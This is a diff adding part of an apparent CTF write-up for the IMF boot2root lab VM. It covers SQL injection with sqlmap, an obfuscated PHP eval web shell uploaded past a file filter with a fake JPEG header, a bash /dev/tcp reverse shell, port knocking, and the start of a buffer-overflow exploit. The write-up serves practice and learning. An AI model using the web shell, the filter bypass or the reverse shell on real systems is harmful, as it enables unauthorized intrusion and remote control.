@@ -164,6 +164,210 @@ The script compares the user input from the <code>pass</code> field to the hardc
 
 <h2 id="flag-4">FLAG 4</h2>
 
+<p>The <code>hard-coded</code> hint is used, then we need to use <code>SQL</code> here. Of course, only param <code>pagename</code> can be used.</p>
+
+<p>Try <code>?pagename=home' AND 1=1</code> got error notice. So, It&rsquo;s an error-based SQL Injection.</p>
+
+<p>I tried to manually inject, but failed. I have to fire up my SQLMap: <code>sqlmap --cookie=&quot;PHPSESSID=jpsp94fmu4hpmkkij9i5msub05&quot; -u &quot;http://172.16.51.134/imfadministrator/cms.php?pagename=home&quot; -D information_schema</code> and I found the <code>SCHEMATA</code> recorded a database <code>admin</code>, enumerate this database again. I found a table called <code>pages</code>, then <code>tutorials-incomplete</code>, Let&rsquo;s try it.</p>
+
+<p>A QR Code on the page. Decode it via Chrome Extension <code>Simple QR Generator</code>, found: <code>flag4{dXBsb2Fkcjk0Mi5waHA=}</code>.</p>
+
+<p>Decode again: uploadr942.php</p>
+
+<h2 id="flag-5">FLAG 5</h2>
+
+<p>Access <code>http://172.16.51.134/imfadministrator/uploadr942.php</code>, Intelligence upload form? WTF?! Try to upload a shell.</p>
+
+<p>Generate via AntSword again.</p>
+
+<pre><code>&lt;?php // 使用时请删除此行, 连接密码: NLRbeHys ?&gt;
+&lt;?php $jtch=create_function(str_rot13('$').chr(01212-01027).chr(0330272/01746).chr(01272-01115).chr(564-463),str_rot13('r').str_rot13('i').str_rot13('n').str_rot13('y').str_rot13('(').str_rot13('$').chr(546-431).chr(0x136-0xc7).str_rot13('z').str_rot13('r').str_rot13(')').str_rot13(';'));$jtch(str_rot13('517475;@riNy($_CBFG[AYEorUlf]);1552425;'));?&gt;
+</code></pre>
+
+<p>$someeval($some);
+517475;@evAl($_POST[NLRbeHys]);1552425;</p>
+
+<p>got: <code>Error: Invalid filetype (php)</code>. Let&rsquo;s try to change to <code>jpg</code>, then, got: <code>Error: CrappyWAF detected malware. Signature: Base64_decode php function detected</code>.
+<code>eval</code> function also get banned.</p>
+
+<p>So we use <code>FFD8FFE0</code> as prefix to build a fake jpg file to bypass it. Then After successfully uploaded, you got: <code>&lt;!-- 577539cb4b62 --&gt;</code> in source code. Next question is, where is the file uploaded?</p>
+
+<p>GOBUSTER! <code>gobuster -u http://172.16.51.134/imfadministrator -w /media/kmahyyg/linuxdata/WorkData/HostedOnGithub/hackbox_tools/utils/outsidetools/dictionaries/DirBuster-Lists/directory-list-2.3-medium.txt -x txt,html,php,jpg -o imf.txt</code></p>
+
+<p>Then: <code>images</code>(200) and <code>uploads</code>(403), that&rsquo;s it <code>/imfadministrator/uploads/577539cb4b62.jpg</code>, gosh, but not executed.</p>
+
+<p>Then modify the file extension to <code>gif</code>, wow! executed! The server must interprete the <code>gif</code> as <code>php</code> script. Now, let&rsquo;s add a shell here. Just replace those <code>base64_decode()</code> with <code>str_rot13()</code> Try to access <code>/imfadministrator/uploads/bfecff84de07.gif</code></p>
+
+<p>Okay, after that, via Virtual Terminal of AntSword, you&rsquo;ll do anything you love.</p>
+
+<p>The flag is under <code>uploads</code> and called <code>flag5_abc123def.txt</code>: <code>flag5{YWdlbnRzZXJ2aWNlcw==}</code>.</p>
+
+<p>Decode again: agentservices</p>
+
+<p>The <code>.htaccess</code> in this folder told us all.</p>
+
+<h2 id="flag-6">Flag 6</h2>
+
+<p>This machine is designated to be <code>boot2root</code>. And with a kernel version <code>4.4.0-45.66</code> and <code>Ubuntu 16.04.1 LTS</code>,</p>
+
+<p>Earlier Kernel Version Than:</p>
+
+<ul>
+<li>4.8.0-26.28 for Ubuntu 16.10</li>
+<li>4.4.0-45.66 for Ubuntu 16.04 LTS</li>
+<li>3.13.0-100.147 for Ubuntu 14.04 LTS</li>
+<li>3.2.0-113.155 for Ubuntu 12.04 LTS</li>
+<li>3.16.36-1+deb8u2 for Debian 8</li>
+<li>3.2.82-1 for Debian 7</li>
+<li>4.7.8-1 for Debian unstable</li>
+</ul>
+
+<p>are affected by DirtyCoW. So this kernel just fixed this vulnerability.</p>
+
+<p><code>agentservices</code> ? Strange&hellip;</p>
+
+<p>I think there might be something to dig, but I&rsquo;m so lazy and tired.</p>
+
+<p>bash -c &lsquo;bash -i &amp;&gt;/dev/tcp/192.168.1.<sup>68</sup>&frasl;<sub>9943</sub> 0&lt;&amp;1&rsquo;</p>
+
+<p>LinEnum first:</p>
+
+<ul>
+<li>Kernel header found. GCC Found. (MAYBE COULD TRY DIRTYCOW)</li>
+<li>A user called <code>setup</code> found. (USELESS)</li>
+<li><code>tmux</code>, <code>screen</code> found</li>
+<li><code>systemd-tmp-files-clean.services</code> found</li>
+<li><code>/usr/bin/knockd -d</code>  (NO PERMISSION TO CHECK CONFIG)</li>
+<li><code>/usr/sbin/sshd -D</code>    (DISABLED ACCESS)</li>
+<li><code>/usr/sbin/xinetd -pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6</code></li>
+</ul>
+
+<p><code>/etc/xinetd.d</code> has a file called <code>agent</code>, let&rsquo;s check.</p>
+
+<pre><code>service agent
+{
+       flags          = REUSE
+       socket_type    = stream
+       wait           = no
+       user           = root
+       server         = /usr/local/bin/agent
+       log_on_failure += USERID
+       disable        = no
+       port           = 7788
+}
+</code></pre>
+
+<p>Interesting&hellip;</p>
+
+<p>Found <code>access_codes</code> here: <code>SYN 7482,8279,9467</code>
+Seems like knockd config.</p>
+
+<p>Use nmap to send SYN packet.</p>
+
+<p><code>nmap -sS -p7482,8279,9467 172.16.51.134</code> Then port 7788 opened!</p>
+
+<p><code>nc 172.16.51.134 7788</code> it! A binary which ask you for their agent ID&hellip;</p>
+
+<p>Download and disassemble. <code>file agent</code>:</p>
+
+<pre><code>./agent_binary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=444d1910b8b99d492e6e79fe2383fd346fc8d4c7, not stripped
+</code></pre>
+
+<p>Then <code>checksec</code> to help us if we can get something&hellip;</p>
+
+<pre><code>* Kernel protection information:
+
+  Description - List the status of kernel protection mechanisms. Rather than
+  inspect kernel mechanisms that may aid in the prevention of exploitation of
+  userspace processes, this option lists the status of kernel configuration
+  options that harden the kernel itself against attack.
+
+  Kernel config:
+/boot/config-4.4.0-45-generic
+
+  Warning: The config on disk may not represent running kernel config!
+
+  Vanilla Kernel ASLR:                    Full
+  Protected symlinks:                     Disabled
+  Protected hardlinks:                    Disabled
+  Ipv4 reverse path filtering:            Enabled
+  Ipv6 reverse path filtering:            Disabled
+  Kernel heap randomization:              Enabled
+
+  GCC stack protector support:            Enabled
+
+  GCC stack protector strong:             Enabled
+
+
+  Restrict /dev/mem access:               Enabled
+  Restrict I/O access to /dev/mem:        Disabled
+  Enforce read-only kernel data:          Enabled
+  Enforce read-only module data:          Enabled
+  Exec Shield:                            Disabled
+
+
+  Restrict /dev/kmem access:              Enabled
+
+* X86 only:            
+  Strict user copy checks:                Disabled
+
+  Address space layout randomization:     Enabled
+
+* SELinux:                                Disabled
+
+  SELinux infomation available here: 
+    http://selinuxproject.org/
+
+* grsecurity / PaX:                       No GRKERNSEC
+
+  The grsecurity / PaX patchset is available here:
+    http://grsecurity.net/
+</code></pre>
+
+<p>About the binary:</p>
+
+<pre><code>./checksec -f /usr/local/bin/agent
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   83 Symbols     No       0               8       /usr/local/bin/agent
+</code></pre>
+
+<blockquote>
+<p>Maybe it&rsquo;s time to write a new article about ltrace and strace, they&rsquo;re really useful here.</p>
+</blockquote>
+
+<p>Just <code>ltrace /usr/local/bin/agent</code> Insert any id, then you got this:</p>
+
+<pre><code>ltrace /usr/local/bin/agent
+__libc_start_main(0x80485fb, 1, 0xffe4c644, 0x8048970 &lt;unfinished ...&gt;
+setbuf(0xf7796d60, 0)                            = &lt;void&gt;
+asprintf(0xffe4c578, 0x80489f0, 0x2ddd984, 0xf75fe0ec) = 8
+puts(&quot;  ___ __  __ ___ &quot;  ___ __  __ ___ 
+)                        = 18
+puts(&quot; |_ _|  \\/  | __|  Agent&quot; |_ _|  \/  | __|  Agent
+)                = 25
+puts(&quot;  | || |\\/| | _|   Reporting&quot;  | || |\/| | _|   Reporting
+)            = 29
+puts(&quot; |___|_|  |_|_|    System\n&quot; |___|_|  |_|_|    System
+
+)              = 27
+printf(&quot;\nAgent ID : &quot;
+Agent ID : )                          = 12
+fgets(909900
+&quot;909900\n&quot;, 9, 0xf77965a0)                 = 0xffe4c57e
+strncmp(&quot;909900\n&quot;, &quot;48093572&quot;, 8)               = 1
+puts(&quot;Invalid Agent ID &quot;Invalid Agent ID 
+)                        = 18
++++ exited (status 254) +++
+</code></pre>
+
+<p>MSF created 500 bytes:</p>
+
+<p>gdb and use <code>3</code> to submit to get an buffer overflow: 0x41366641</p>
+
+<p>Found the buffer overflow at offset 168.</p>
+
+<p>Now It&rsquo;s time to build the shellcode.</p>
+
       </article>
       <div id="disqus_thread"></div>
 <script type="application/javascript">
